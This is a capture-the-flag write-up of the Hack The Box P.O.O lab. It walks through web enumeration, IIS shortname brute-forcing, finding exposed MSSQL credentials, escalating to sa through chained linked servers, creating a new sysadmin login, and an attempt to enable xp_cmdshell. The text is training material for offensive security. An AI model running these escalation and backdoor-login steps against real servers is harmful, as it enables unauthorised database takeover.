---
title: "P.O.O"
description: A writeup on the P.O.O Prolab.
date: 2024-10-07
draft: false # this section allows the post to be published and be public, is it is set to true the post will not be published.
summary: "Professional Offensive Operations" # Here you can write a small summary of the post if needed
tags: [HTB, Mini-prolab, Beginner ]
categories: [AD, Prolabs]
---
# P.O.O (Professional Offensive Operations)


# Machine Info

> Professional Offensive Operations
> By [eks](https://app.hackthebox.com/home/users/profile/302) and [mrb3n](https://app.hackthebox.com/home/users/profile/2984)
> Professional Offensive Operations is a rising name in the cyber security world.
> Lately they've been working into migrating core services and 
> components to a state of the art cluster which offers cutting edge 
> software and hardware.
> P.O.O. is designed to put your skills in enumeration, lateral 
> movement, and privilege escalation to the test within a small Active 
> Directory environment that is configured with the latest operating 
> systems and technologies.
> The goal is to compromise the perimeter host, escalate privileges and
> ultimately compromise the domain while collecting several flags along 
> the way.
> Entry Point: `10.13.38.11` 
> Aside from the above, we are to get our foothold onto the macine through a n sql server and pivot our way from there to the admin level.

# Enumeration

We shall start first by seeing if our entry point is accessible by pinging it as seen below.

![image.png](image.png)

Our entry point is accessible, we shall then proceed to scan our IP for open ports using nmap.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ nmap -sCV 10.13.38.11       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 04:23 EAT
Nmap scan report for 10.13.38.11
Host is up (0.30s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-06T09:29:44
|_Not valid after:  2054-10-06T09:29:44
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
|_ssl-date: 2024-10-07T01:24:34+00:00; +3s from scanner time.
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.84 seconds

```

As seen above, we have two open ports, 80, 1443. we shall start by seeing what is on port 80

## HTTP Enumeration

We are met with an IIS server page.

![image.png](image%201.png)

we shall try to do directory fuzzing to see what directories are available using gobuster. I found some interesting directories, as seen below.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.13.38.11:80          
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.13.38.11:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 152] [--> http://10.13.38.11:80/images/]
/templates            (Status: 301) [Size: 155] [--> http://10.13.38.11:80/templates/]
/themes               (Status: 301) [Size: 152] [--> http://10.13.38.11:80/themes/]
/uploads              (Status: 301) [Size: 153] [--> http://10.13.38.11:80/uploads/]
/Images               (Status: 301) [Size: 152] [--> http://10.13.38.11:80/Images/]
/admin                (Status: 401) [Size: 1293]
/plugins              (Status: 301) [Size: 153] [--> http://10.13.38.11:80/plugins/]
/dev                  (Status: 301) [Size: 149] [--> http://10.13.38.11:80/dev/]
/js                   (Status: 301) [Size: 148] [--> http://10.13.38.11:80/js/]
/Themes               (Status: 301) [Size: 152] [--> http://10.13.38.11:80/Themes/]                                                                               
Progress: 1786 / 220561 (0.81%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1801 / 220561 (0.82%)
===============================================================
Finished
===============================================================

```

there is an admin and uploads page, lets try to visit it to see what we can find.

![image.png](image%202.png)

![image.png](image%203.png)

We are required to log in but we do not have a clue of any user, however, after trying to log in with the user admin and password as admin, still nothing. Therefore we shall continue with enumeration with a big wordlist to see if we can find anything that is of interest to us, this time I used the wordlist `raft-large-words-lowercase.txt`I found an interesting directory.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -u http://10.13.38.11:80           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.13.38.11:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 152] [--> http://10.13.38.11:80/images/]
/templates            (Status: 301) [Size: 155] [--> http://10.13.38.11:80/templates/]
/admin                (Status: 401) [Size: 1293]
/plugins              (Status: 301) [Size: 153] [--> http://10.13.38.11:80/plugins/]
/js                   (Status: 301) [Size: 148] [--> http://10.13.38.11:80/js/]
/themes               (Status: 301) [Size: 152] [--> http://10.13.38.11:80/themes/]
/uploads              (Status: 301) [Size: 153] [--> http://10.13.38.11:80/uploads/]
/dev                  (Status: 301) [Size: 149] [--> http://10.13.38.11:80/dev/]
/.                    (Status: 200) [Size: 703]
/widgets              (Status: 301) [Size: 153] [--> http://10.13.38.11:80/widgets/]
/meta-inf             (Status: 301) [Size: 154] [--> http://10.13.38.11:80/meta-inf/]                                                                             
/.ds_store            (Status: 200) [Size: 10244]
Progress: 9547 / 107983 (8.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9557 / 107983 (8.85%)
===============================================================
Finished
===============================================================

```

.ds_store

## .DS_Store Enumeration

`.DS_Store` files are actually [created by MacOS](https://en.wikipedia.org/wiki/.DS_Store) when it visits a directory. They store attributes of the folder and the files within it. Likely here the site was developed on a Mac and then 
deployed to this Windows server. The structure of the `.ds_store` file is proprietary, but it has been reversed (see [this post](https://0day.work/parsing-the-ds_store-file-format/) for an excellent deep dive).

I first found the [Python-dsstore](https://github.com/gehaxelt/Python-dsstore) tool to parse `.DS_Store` files, then later learned of [DS_Walk](https://github.com/Keramas/DS_Walk), which uses `dsstore.py` to recursively walk a webserver. I will clone the repo and parse it the webserver

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/.ds_store/DS_Walk]
└─$ python3 ds_walk.py -u http://10.13.38.11
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/iisstart.htm
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/JS
[!] http://10.13.38.11/META-INF
[!] http://10.13.38.11/New folder
[!] http://10.13.38.11/New folder (2)
[!] http://10.13.38.11/Plugins
[!] http://10.13.38.11/Templates
[!] http://10.13.38.11/Themes
[!] http://10.13.38.11/Uploads
[!] http://10.13.38.11/web.config
[!] http://10.13.38.11/Widgets
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11/Images/buttons
[!] http://10.13.38.11/Images/icons
[!] http://10.13.38.11/Images/iisstart.png
----------------------------
[!] http://10.13.38.11/JS/custom
----------------------------
[!] http://10.13.38.11/Themes/default
----------------------------
[!] http://10.13.38.11/Widgets/CalendarEvents
[!] http://10.13.38.11/Widgets/Framework
[!] http://10.13.38.11/Widgets/Menu
[!] http://10.13.38.11/Widgets/Notifications
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts/custom
[!] http://10.13.38.11/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk
```

This gives a pretty clear picture of the directories on the server. One thing that jumped out is the two directories in `/dev`, both of which look like md5hashes. Some quick guessing shows that they are actually md5 hashes of the two creators, `md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1` and `md5(eks) = dca66d38fd916317687e1390a420c3fc`.

![image.png](image%204.png)

![image.png](image%205.png)

## IIS Shortnames

A key technique here is to exploit Windows' short file names, known as the 8.3 naming convention, which restricts each file name to eight characters followed by a dot and a three-character extension. There was an [intriguing paper](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf) that explored how earlier versions of IIS and .NET handle these 8.3 file names. The method involves examining how the server deals with 8.3 names that include wildcards, which it appears to process when the tilde (~) symbol is present in the file path.

Different servers may require different HTTP request methods to detect this behavior. On this particular server, the issue doesn’t appear with a GET request, but is exposed using an OPTIONS request. For instance, using gobuster, I found that there is a folder called templates in the root directory. When I send an OPTIONS request to [http://10.13.38/11/t*~1*/.aspx](http://10.13.0.38/11/t*~1*/.aspx), the server responds with a 404 error. However, when I send a request to [http://10.13.38/11/c*~1*/.aspx](http://10.13.0.38/11/c*~1*/.aspx), it responds with a 200 status code.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ curl -s -I -X OPTIONS 'http://10.13.38.11/c*~1*/.aspx'
HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST
Server: Microsoft-IIS/10.0
Public: OPTIONS, TRACE, GET, HEAD, POST
Date: Mon, 07 Oct 2024 02:11:52 GMT
Content-Length: 0

                                                                                 
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ curl -s -I -X OPTIONS 'http://10.13.38.11/t*~1*/.aspx'
HTTP/1.1 404 Not Found
Content-Type: text/html
Server: Microsoft-IIS/10.0
Date: Mon, 07 Oct 2024 02:12:10 GMT
Content-Length: 1245

```

I tried each character and got the next character to be s, as seen below.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ curl -s -I -X OPTIONS 'http://10.13.38.11/ta*~1*/.aspx'
HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST
Server: Microsoft-IIS/10.0
Public: OPTIONS, TRACE, GET, HEAD, POST
Date: Mon, 07 Oct 2024 02:14:08 GMT
Content-Length: 0

                                                                                 
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O]
└─$ curl -s -I -X OPTIONS 'http://10.13.38.11/tem*~1*/.aspx'
HTTP/1.1 404 Not Found
Content-Type: text/html
Server: Microsoft-IIS/10.0
Date: Mon, 07 Oct 2024 02:14:15 GMT
Content-Length: 1245

```

However, this does not work for  all directories / files. It does not find `/admin`,likely due to permissions. I found a couple of tools to do the brute force. [This tool](https://github.com/irsdl/IIS-ShortName-Scanner) is the one associated with the research paper above, but it’s in Java, so I kept looking and found [this Python scanner](https://github.com/lijiejie/IIS_shortname_Scanner). When running it on the root directory, it found some of the stuff in it:

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ python3 iis_shortname_scan.py  http://10.13.38.11/ 
Server is vulnerable, please wait, scanning...
[+] /d~1.*      [scan in progress]
[+] /n~1.*      [scan in progress]
[+] /t~1.*      [scan in progress]
[+] /w~1.*      [scan in progress]
[+] /ds~1.*     [scan in progress]
[+] /ne~1.*     [scan in progress]
[+] /te~1.*     [scan in progress]
[+] /tr~1.*     [scan in progress]
[+] /we~1.*     [scan in progress]
[+] /ds_~1.*    [scan in progress]
[+] /new~1.*    [scan in progress]
[+] /tem~1.*    [scan in progress]
[+] /tra~1.*    [scan in progress]
[+] /web~1.*    [scan in progress]
[+] /ds_s~1.*   [scan in progress]
[+] /newf~1.*   [scan in progress]
[+] /temp~1.*   [scan in progress]
[+] /tras~1.*   [scan in progress]
[+] /ds_st~1.*  [scan in progress]
[+] /newfo~1.*  [scan in progress]
[+] /templ~1.*  [scan in progress]
[+] /trash~1.*  [scan in progress]
[+] /ds_sto~1.* [scan in progress]
[+] /newfol~1.* [scan in progress]
[+] /templa~1.* [scan in progress]
[+] /trashe~1.* [scan in progress]
[+] /ds_sto~1   [scan in progress]
[+] Directory /ds_sto~1 [Done]
[+] /newfol~1   [scan in progress]
[+] Directory /newfol~1 [Done]
[+] /templa~1   [scan in progress]
[+] Directory /templa~1 [Done]
[+] /trashe~1   [scan in progress]
[+] Directory /trashe~1 [Done]
----------------------------------------------------------------
Dir:  /ds_sto~1
Dir:  /newfol~1
Dir:  /templa~1
Dir:  /trashe~1
----------------------------------------------------------------
4 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

I'm unsure why the script omits the dot before `.DS_Store`. It classifies it as a directory because, in the 8.3 naming scheme, files without an extension are interpreted as directories.

What's more intriguing is the behavior when I run the script against the `/dev` directories. At the root, it only detects `.DS_Store` and the two hash directories that I already know exist. Inside each of the hash directories, it only identifies `.DS_Store`. Interestingly, it shows that the `src`, `include`, and `core` directories are not vulnerable, but the `db` directory displays what seems to be the same file in both instances:

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ python3 iis_shortname_scan.py  http://10.13.38.11/dev/
Server is vulnerable, please wait, scanning...
[+] /dev/d~1.*  [scan in progress]
[+] /dev/3~1.*  [scan in progress]
[+] /dev/ds~1.* [scan in progress]
[+] /dev/dc~1.* [scan in progress]
[+] /dev/30~1.* [scan in progress]
[+] /dev/ds_~1.*        [scan in progress]
[+] /dev/dca~1.*        [scan in progress]
[+] /dev/304~1.*        [scan in progress]
[+] /dev/ds_s~1.*       [scan in progress]
[+] /dev/dca6~1.*       [scan in progress]
[+] /dev/304c~1.*       [scan in progress]
[+] /dev/ds_st~1.*      [scan in progress]
[+] /dev/dca66~1.*      [scan in progress]
[+] /dev/304c0~1.*      [scan in progress]
[+] /dev/ds_sto~1.*     [scan in progress]
[+] /dev/dca66d~1.*     [scan in progress]
[+] /dev/304c0c~1.*     [scan in progress]
[+] /dev/ds_sto~1       [scan in progress]
[+] Directory /dev/ds_sto~1     [Done]
[+] /dev/dca66d~1       [scan in progress]
[+] Directory /dev/dca66d~1     [Done]
[+] /dev/304c0c~1       [scan in progress]
[+] Directory /dev/304c0c~1     [Done]
----------------------------------------------------------------
Dir:  /dev/ds_sto~1
Dir:  /dev/dca66d~1
Dir:  /dev/304c0c~1
----------------------------------------------------------------
3 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
                                                                                 
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ python3 iis_shortname_scan.py  http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db 
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
                                                                                 
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ python3 iis_shortname_scan.py  http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
Server is vulnerable, please wait, scanning...
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/p~1.*      [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/po~1.*     [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo~1.*    [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_~1.*   [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_c~1.*  [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.* [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.t*        [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.tx*       [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*      [scan in progress]
[+] File /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* [Done]
----------------------------------------------------------------
File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
                                                                      
```

## File fuzzing

I’m aware of a `.txt` file in `/dev/304c0c90fbc6520610abbf378e2339d1/db/` that begins with `poo_co`. At this point, I can use `wfuzz` to try and discover the rest of the filename. To narrow down the search, I’ll extract words starting with 'co' from `raft-large-words-lowercase.txt`, which generates a relatively compact wordlist to work with:

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ grep "^co" /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_fuzzing.txt 
                                                                                 
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ wc -l co_fuzzing.txt
2351 co_fuzzing.txt

```

lets try and fuzz now.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ wfuzz -c -w co_fuzzing.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
Total requests: 2351

=====================================================================
ID           Response   Lines    Word       Chars       Payload         
=====================================================================

000000097:   200        6 L      7 W        142 Ch      "connection"    

Total time: 87.84663
Processed Requests: 2351
Filtered Requests: 2350
Requests/sec.: 26.76255

```

Retrieving this file (from either `dev` directory) reveals connection details for MSSQL and the first flag, Recon:

```bash

┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : [REDACTED]
```

# Huh?!

## MSSQL Enumeration.

Using creds from the previous step, I can now connect to the MSSQL instance on TCP 1433

```bash
┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 88) 
[!] Press help for extra shell commands
SQL (external_user  external_user@master)> 
```

I can perform basic server enumeration to gather information such as the MSSQL version, user accounts, and admin users:

```bash
SQL (external_user  external_user@master)> select @@version;
                                                                                                                                                                                                                                            
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) 
        Jun 20 2024 11:02:32 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (external_user  external_user@master)> select name FROM master..syslogins
name            
-------------   
sa              

external_user   

SQL (external_user  external_user@master)> select name FROM master..syslogins WHERE sysadmin = '1';
name   
----   
sa   
```

Although we have found two users, there is one other user, the `admin` . I can enumerate my privileges to see what activities I can do on the server.

```bash
SQL (external_user  external_user@master)>  SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');
entity_name   permission_name   
-----------   ---------------   
server        CONNECT SQL    
```

I can list the databases and find the current one.

```bash
SQL (external_user  external_user@master)> SELECT name FROM master..sysdatabases;
name         
----------   
master       

tempdb       

POO_PUBLIC   

SQL> SELECT DB_NAME();
------------------------------
master  
```

I explored the different tables and their columns, but didn’t come across anything significant worth sharing.

## **Linked Servers**

### Enumeration

[This article](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/) provides a useful guide on how to exploit SQL Server links. An SQL Server link allows an MSSQL server to connect to external data sources, including other MSSQL servers, Oracle databases, Excel workbooks, and more. The link specifies which resources are accessed and under which user account. If not properly configured, this can be exploited.

```bash
SQL (external_user  external_user@master)> select @@servername
                           
------------------------   
COMPATIBILITY\POO_PUBLIC  
```

To check for linked servers, I’ll query the `sysservers` table (the article recommends `*`, but I’ll just show the name for readability):

```bash
SQL (external_user  external_user@master)> select srvname from sysservers;
srvname                    
------------------------   
COMPATIBILITY\POO_CONFIG   

COMPATIBILITY\POO_PUBLIC  
```

There is another linked remote server, POO_CONFIG.

**POO_CONFIG**

I found `EXECUTE`,  to be much more successful, however, from the article `openquery` is used to run queries on other servers.

```bash
SQL (external_user  external_user@master)> EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
                           
------------------------   
COMPATIBILITY\POO_CONFIG  
```

The link is set up to execute commands as the `internal_user`:

```bash
SQL (external_user  external_user@master)> EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
                
-------------   
internal_user  
```

The user we found is not an admin.

```bash
SQL (external_user  external_user@master)> EXECUTE ('select name FROM master..syslogins WHERE sysadmin = ''1'';') at [COMPATIBILITY\POO_CONFIG];
name   
----   
sa     

SQL (external_user  external_user@master)> EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG];
entity_name   permission_name   
-----------   ---------------   
server        CONNECT SQL    
```

looking at the data in the tables, I found nothing of interest.

I tried to have POO_CONFIG run a command on POO_PUBLIC and it works as seen below.

```bash
SQL (external_user  external_user@master)>  EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
     
--   
sa  
```

Not only did it succeed, but that command is now being executed as the `sa` user! This misconfiguration occurs because when the two links between the databases were established, the first link allows any user on `POO_PUBLIC` to run queries (i.e., commands) on `POO_CONFIG` as `internal_user`. The second link must have been configured so that any user on `POO_CONFIG` can run queries on `POO_PUBLIC` as `sa`. This second link may have seemed reasonable to an administrator at the time, as only trusted individuals would have access to the internal `POO_PUBLIC`. It's easy to overlook the other link.

Now, when I check my permissions locally on `POO_CONFIG` with the current user, I find that I have almost no privileges:

```bash
SQL (external_user  external_user@master)> EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG]
entity_name   permission_name   
-----------   ---------------   
server        CONNECT SQL  
```

However, when I ask POO_CONFIG to POO_PUBLIC, I’ve got all the permissions:

```bash
SQL (external_user  external_user@master)> EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
entity_name   permission_name                   
-----------   -------------------------------   
server        CONNECT SQL                       

server        SHUTDOWN                          

server        CREATE ENDPOINT                   

server        CREATE ANY DATABASE               

server        CREATE AVAILABILITY GROUP         

server        ALTER ANY LOGIN                   

server        ALTER ANY CREDENTIAL              

server        ALTER ANY ENDPOINT                

server        ALTER ANY LINKED SERVER           

server        ALTER ANY CONNECTION              

server        ALTER ANY DATABASE                

server        ALTER RESOURCES                   

server        ALTER SETTINGS                    

server        ALTER TRACE                       

server        ALTER ANY AVAILABILITY GROUP      

server        ADMINISTER BULK OPERATIONS        

server        AUTHENTICATE SERVER               

server        EXTERNAL ACCESS ASSEMBLY          

server        VIEW ANY DATABASE                 

server        VIEW ANY DEFINITION               

server        VIEW SERVER STATE                 

server        CREATE DDL EVENT NOTIFICATION     

server        CREATE TRACE EVENT NOTIFICATION   

server        ALTER ANY EVENT NOTIFICATION      

server        ALTER SERVER STATE                

server        UNSAFE ASSEMBLY                   

server        ALTER ANY SERVER AUDIT            

server        CREATE SERVER ROLE                

server        ALTER ANY SERVER ROLE             

server        ALTER ANY EVENT SESSION           

server        CONNECT ANY DATABASE              

server        IMPERSONATE ANY LOGIN             

server        SELECT ALL USER SECURABLES        

server        CONTROL SERVER                    

```

To make our work easier, I shall add another `sa` user to make our work easier rather than keep on bouncing everything every time.

```bash
SQL (external_user  external_user@master)> EXECUTE('EXECUTE(''CREATE LOGIN df WITH PASSWORD = ''''victor_n00b'''';'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
SQL (external_user  external_user@master)> EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''df'''', ''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
SQL (external_user 
```

Lets try to connect to the server with our new admin account.

```bash
┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py df:victor_n00b@10.13.38.11
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 88) 
[!] Press help for extra shell commands
SQL (df  dbo@master)>
```

we are in, lets get our DB flag now. As the new `sa` user,  I can now access another database `flag`  and to query a  I can now access another database in MSSQL, the syntax is `[server].[db].[schema].[table]`. Therefore, I can retrieve the flag using the following command as shown below.

```bash
SQL (df  dbo@master)> SELECT name FROM master..sysdatabases;
name         
----------   
master       

tempdb       

model        

msdb         

POO_PUBLIC   

flag         

SQL (df  dbo@master)> select table_schema from flag.INFORMATION_SCHEMA.TABLES;
table_schema   
------------   
dbo            

SQL (df  dbo@master)> select * from flag.dbo.flag
flag                                       
----------------------------------------   
b'POO{[REDACTED]}'   
```

# BackTrack

Now that I’m sa on the database, I want to get a shell on the host. I’ll try `xp_cmdshell`, but it fails.

```bash

SQL (df  dbo@master)> xp_cmdshell whoami
ERROR(COMPATIBILITY\POO_PUBLIC): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

it could be the command is disabled, lets try to enable it.

```bash
SQL (df  dbo@master)> enable_xp_cmdshell
INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
ERROR(COMPATIBILITY\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified!
